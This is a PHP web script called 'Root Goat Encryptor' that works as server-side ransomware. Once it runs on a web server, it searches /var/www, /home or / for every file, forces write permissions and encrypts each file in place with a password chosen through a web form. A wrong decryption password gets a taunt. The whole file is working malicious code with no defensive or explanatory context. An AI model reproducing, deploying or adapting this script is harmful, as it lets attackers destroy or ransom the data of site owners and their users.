<?php
// ===== CONFIG =====
ini_set('display_errors', 1);
error_reporting(E_ALL);
ini_set('memory_limit', '400M');
set_time_limit(300);

$encryptionAlgorithms = ['AES-128-CBC', 'AES-256-CBC', 'DES-EDE3-CBC'];
$selfFile = basename(__FILE__);
$logFile = __DIR__ . '/encryption_log.txt';
$resumeLog = __DIR__ . '/resume_log.txt';

// ===== ROOT DETECTION =====
$possibleRoots = ['/var/www', '/home', '/'];
foreach ($possibleRoots as $path) {
    if (is_readable($path)) {
        $startDir = realpath($path);
        break;
    }
}
if (!isset($startDir)) die("‚ùå No accessible root directory found.");

// ===== ENCRYPT FUNCTION =====
function encryptFile($file, $password, $method) {
    $ivLength = openssl_cipher_iv_length($method);
    $iv = openssl_random_pseudo_bytes($ivLength);
    $data = file_get_contents($file);
    $cipher = openssl_encrypt($data, $method, $password, OPENSSL_RAW_DATA, $iv);
    if ($cipher === false) return false;
    file_put_contents($file, base64_encode($iv . $cipher));
    return true;
}

// ===== DECRYPT FUNCTION =====
function decryptFile($file, $password, $method) {
    $data = base64_decode(file_get_contents($file));
    $ivLength = openssl_cipher_iv_length($method);
    $iv = substr($data, 0, $ivLength);
    $ciphertext = substr($data, $ivLength);
    $plain = openssl_decrypt($ciphertext, $method, $password, OPENSSL_RAW_DATA, $iv);
    if ($plain === false) {
        echo "<p style='color:red;'>‚ùå >> don't try to use your mind kid's password is worng <<</p>";
        return false;
    }
    file_put_contents($file, $plain);
    return true;
}

// ===== LOG SYSTEM =====
function loadResumeLog($path) {
    if (!file_exists($path)) return [];
    return file($path, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
}
function appendToResumeLog($file) {
    global $resumeLog;
    file_put_contents($resumeLog, $file . PHP_EOL, FILE_APPEND);
}

// ===== FILE PROCESSOR =====
function processDir($dir, $password, $method, $action, $skip = []) {
    global $logFile, $resumeLog, $selfFile;
    $processed = loadResumeLog($resumeLog);
    $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS));

    foreach ($rii as $file) {
        if ($file->isDir()) continue;
        $filePath = $file->getPathname();
        $fileName = basename($filePath);

        if (in_array($filePath, $processed) || in_array($fileName, [$selfFile, basename($logFile), basename($resumeLog)])) {
            echo "<p style='color:gray;'>‚è© Skipped: $filePath</p>";
            continue;
        }

        if (!is_writable($filePath)) @chmod($filePath, 0644);
        if (!is_writable($filePath)) {
            echo "<p style='color:orange;'>‚ö†Ô∏è Locked: $filePath</p>";
            continue;
        }

        $result = false;
        if ($action === 'encrypt') {
            $result = encryptFile($filePath, $password, $method);
            if (!file_exists($logFile)) {
                file_put_contents($logFile, "method=$method\nstart=" . date("Y-m-d H:i:s") . "\n");
            }
            if ($result) appendToResumeLog($filePath);
        } elseif ($action === 'decrypt') {
            $result = decryptFile($filePath, $password, $method);
        }

        $status = $result ? "‚úÖ Success" : "‚ùå Fail";
        echo "<p>$status: $filePath</p>";
        flush(); ob_flush();
        usleep(300000);
    }

    if ($action === 'decrypt') {
        @unlink($logFile);
        @unlink($resumeLog);
    }
}

// ===== MODE DETECTION =====
$isEncrypted = file_exists($logFile);
$lockMode = $isEncrypted ? 'decrypt' : 'encrypt';
$logMethod = 'AES-256-CBC';

if ($isEncrypted) {
    $lines = file($logFile, FILE_IGNORE_NEW_LINES);
    foreach ($lines as $line) {
        if (strpos($line, 'method=') === 0) {
            $logMethod = trim(str_replace('method=', '', $line));
            break;
        }
    }
}

// ===== FORM HANDLER =====
$result = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $password = $_POST['password'] ?? '';
    $method = $_POST['method'] ?? '';
    $action = $_POST['action'] ?? '';

    if (!in_array($method, $encryptionAlgorithms)) {
        $result = "‚ùå Invalid method.";
    } elseif (empty($password)) {
        $result = "‚ùå Password required.";
    } else {
        echo "<div style='padding:15px;background:#222;color:#0f0;border:1px solid #0f0;'><b>üîí Processing from: $startDir</b><br>";
        processDir($startDir, $password, $method, $action);
        echo "<b>‚úÖ Done.</b></div>";
        $result = strtoupper($action) . " complete.";
    }
}
?>

<!-- ===== UI ===== -->
<!DOCTYPE html>
<html>
<head>
    <title>üêê Root Goat Encryptor</title>
    <style>
        body { background: #111; color: #eee; font-family: monospace; padding: 30px; }
        .box { background: #1e1e1e; padding: 25px; max-width: 650px; margin: auto; border-radius: 8px; box-shadow: 0 0 15px #000; }
        input, select, button {
            width: 100%; padding: 10px; margin: 10px 0;
            font-size: 16px; border: none; border-radius: 5px;
        }
        button { background: #00cc66; color: white; cursor: pointer; }
        button:hover { background: #00aa55; }
        .msg { background: #222; color: #0f0; padding: 15px; border-left: 5px solid #0f0; margin-top: 10px; }
        h2 { color: #0ff; }
    </style>
</head>
<body>
<div class="box">
    <h2>üß® Root Goat Encryptor</h2>
    <form method="POST">
        <label>Password:</label>
        <input type="password" name="password" required>

        <label>Encryption Method:</label>
        <select name="method" <?= $isEncrypted ? 'readonly' : '' ?>>
            <?php foreach ($encryptionAlgorithms as $algo): ?>
                <option value="<?= $algo ?>" <?= $algo === $logMethod ? 'selected' : '' ?>>
                    <?= $algo ?><?= $algo === $logMethod ? ' (Used)' : '' ?>
                </option>
            <?php endforeach; ?>
        </select>

        <label>Action:</label>
        <select name="action" readonly>
            <option value="<?= $lockMode ?>" selected><?= ucfirst($lockMode) ?></option>
        </select>

        <button type="submit">üîê Run from <?= $startDir ?></button>
    </form>

    <?php if ($result): ?>
        <div class="msg"><?= $result ?></div>
    <?php endif; ?>

    <p style="font-size: 11px; color: #777;">
        Encrypting from root: <code><?= $startDir ?></code><br>
        Logs: <code>encryption_log.txt</code>, <code>resume_log.txt</code><br>
        Resumable & memory-safe mode ON ‚úÖ
    </p>
</div>
</body>
</html>
